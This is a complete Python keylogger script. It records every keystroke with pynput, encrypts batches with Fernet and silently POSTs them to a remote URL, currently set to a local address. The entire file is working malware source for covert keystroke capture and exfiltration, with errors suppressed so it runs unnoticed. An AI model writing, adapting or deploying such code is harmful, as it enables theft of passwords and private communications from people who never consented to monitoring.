from pynput.keyboard import Listener, Key
import requests
from cryptography.fernet import Fernet
import threading
import time
import os

KEY_PATH = os.path.join(os.path.dirname(__file__), "key.key")
with open(KEY_PATH, "rb") as kf:
    key = kf.read()
cipher_suite = Fernet(key)
log = ""
REMOTE_URL = "http://127.0.0.1:5000"

def encrypt_and_send(data):
    enc = cipher_suite.encrypt(data.encode())
    try:
        requests.post(REMOTE_URL, data=enc, timeout=5)
    except:
        pass

def on_press(key):
    global log
    try:
        log += key.char
    except:
        log += f" [{key}] "
    if len(log) > 100:
        threading.Thread(target=encrypt_and_send, args=(log,)).start()
        log = ""

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
